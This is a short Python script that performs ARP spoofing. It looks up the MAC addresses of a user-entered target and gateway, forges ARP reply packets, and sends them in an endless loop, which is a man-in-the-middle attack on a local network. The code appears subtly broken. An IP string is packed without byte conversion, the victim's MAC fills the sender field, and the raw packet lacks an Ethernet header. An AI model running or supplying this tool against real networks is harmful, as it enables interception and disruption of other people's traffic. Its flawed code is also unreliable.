import socket
import struct
import os
import time

def create_arp_packet(target_ip, gateway_ip, target_mac):
    htype = 1
    ptype = 0x0800
    hlen = 6
    plen = 4
    op = 2
    target_ip_bin = socket.inet_aton(target_ip)
    gateway_ip_bin = socket.inet_aton(gateway_ip)
    arp_packet = struct.pack("!HHBBH6s4s6s4s", htype, ptype, hlen, plen, op, target_mac, target_ip_bin, target_mac, gateway_ip_bin)
    return arp_packet

def get_mac(ip):
    pid = os.getpid()
    socket_info = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    socket_info.bind(('eth0', 0))
    dest_mac = b'\xff\xff\xff\xff\xff\xff'
    source_mac = b'\x00\x00\x00\x00\x00\x00'
    ethertype = b'\x08\x06'
    arp_packet = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 1, source_mac, b'\x00\x00\x00\x00', b'\x00\x00\x00\x00', ip)
    packet = dest_mac + source_mac + ethertype + arp_packet
    socket_info.send(packet)
    response = socket_info.recv(2048)
    mac_address = response[6:12]
    socket_info.close()
    return mac_address

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_packet = create_arp_packet(target_ip, gateway_ip, target_mac)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind(('eth0', 0))
    while True:
        s.send(arp_packet)
        print(f"Sent ARP spoofing packet to {target_ip}.")
        time.sleep(2)

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    gateway_ip = input("Enter gateway IP: ")
    arp_spoof(target_ip, gateway_ip)
